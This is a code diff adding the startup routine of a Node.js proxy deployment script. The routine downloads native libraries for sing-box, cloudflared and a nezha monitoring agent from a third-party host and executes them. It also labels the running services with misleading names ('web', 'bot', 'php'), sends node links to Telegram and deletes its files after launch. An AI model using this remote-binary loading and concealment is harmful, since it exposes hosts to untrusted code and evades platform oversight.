+    server.listen(port, '0.0.0.0', () => {
+      console.log(`HTTP subscription server listening on http://0.0.0.0:${port}${subscribePath}`);
+    });
+    server.once('error', err => {
+      if (err.code === 'EADDRINUSE' && retries > 0) {
+        console.log(`Port ${port} in use, trying ${port + 1}...`);
+        tryListen(port + 1, retries - 1);
+      } else {
+        console.error('HTTP server error:', err.message);
+      }
+    });
+  }
+
+  tryListen(httpPort, 5);
+}
+
+// ======================== 主流程 ========================
+
+async function startServer() {
+  // 1. 删除旧节点
+  deleteNodes();
+
+  // 2. 创建运行目录 + 清理文件
+  if (!fs.existsSync(FILE_PATH)) {
+    fs.mkdirSync(FILE_PATH);
+    console.log(`${FILE_PATH} is created`);
+  }
+  cleanupOldFiles();
+
+  // 3. 生成 Argo 隧道配置
+  argoType();
+
+  // 4. 下载 .so 库文件
+  const baseUrl = `https://${arch}.31888.xyz`;
+  const singBoxLib = await downloadLibrary(`${baseUrl}/sbx.so`, 'sbx.so');
+  let cloudflaredLib = null;
+  let nezhaLib = null;
+
+  if (DISABLE_ARGO !== 'true' && DISABLE_ARGO !== true) {
+    cloudflaredLib = await downloadLibrary(`${baseUrl}/bot.so`, 'bot.so');
+  }
+
+  if (NEZHA_SERVER && NEZHA_KEY) {
+    nezhaLib = await downloadLibrary(`${baseUrl}/v1.so`, 'v1.so');
+  } else {
+    console.log('NEZHA variable is empty, skipping nezha-agent');
+  }
+
+  // 5. 生成 Reality 密钥对
+  if (REALITY_PORT) {
+    generateOrLoadKeyPair();
+  }
+
+  // 6. 生成 TLS 证书
+  const certPath = path.join(FILE_PATH, 'cert.pem');
+  const keyPath = path.join(FILE_PATH, 'private.key');
+  const needsTls = !!(HY2_PORT || TUIC_PORT || ANYTLS_PORT);
+  if (needsTls) {
+    ensureTlsCertificates(certPath, keyPath);
+  }
+
+  // 7. 生成 nezha config
+  if (NEZHA_SERVER && NEZHA_KEY && !NEZHA_PORT) {
+    generateNezhaConfig();
+  }
+
+  // 8. 生成 sing-box config.json
+  const sbxConfig = generateSingBoxConfig(certPath, keyPath);
+  fs.writeFileSync(singBoxConfigPath, JSON.stringify(sbxConfig, null, 2));
+
+  // 9. 启动服务
+  const services = [];
+
+  // sing-box
+  const singBoxService = createService('sing-box', singBoxLib, 'StartSingBox', 'StopSingBox', singBoxPayload());
+  services.push(singBoxService);
+
+  // cloudflared
+  let cloudflaredService = null;
+  if (cloudflaredLib) {
+    const cfPayload = cloudflaredPayload();
+    if (cfPayload) {
+      cloudflaredService = createService('cloudflared', cloudflaredLib, 'StartCloudflared', 'StopCloudflared', cfPayload);
+      services.push(cloudflaredService);
+    }
+  }
+
+  // nezha
+  let nezhaService = null;
+  if (nezhaLib) {
+    nezhaService = createService('nezha-agent', nezhaLib, 'StartNezhaAgent', 'StopNezhaAgent', nezhaPayload());
+    services.push(nezhaService);
+  }
+
+  // 信号监听
+  async function stopAll() {
+    for (let i = services.length - 1; i >= 0; i--) {
+      try { await services[i].stop(); } catch (e) { }
+    }
+    process.exit(0);
+  }
+  process.on('SIGINT', stopAll);
+  process.on('SIGTERM', stopAll);
+
+  services.forEach(service => service.start());
+  await new Promise(r => setTimeout(r, 1000));
+  console.log('web is running');
+  if (cloudflaredService) console.log('bot is running');
+  if (nezhaService) console.log('php is running');
+
+  // 10. 等待并检测隧道域名
+  await new Promise(r => setTimeout(r, 5000));
+  const argoDomain = await extractDomain();
+
+  // 11. 生成节点链接
+  const subTxt = await generateLinks(argoDomain);
+
+  // 12. 启动 HTTP 服务器
+  startHttpServer(subTxt);
+
+  // 13. Telegram 推送 + 节点上传 + 自动保活
+  await sendTelegram();
+  await uploadNodes();
+  await addVisitTask();
+
+  // 14. 45秒后清理文件 + 清屏 + 打印欢迎语
+  setTimeout(() => {
+    cleanupFiles({ keepSub: true });
+    clearConsole();
+    console.log('App is running');
+    console.log('Thank you for using this script, enjoy!');
+  }, 45000);
+}
+
+startServer();
+setInterval(() => {}, 1000);
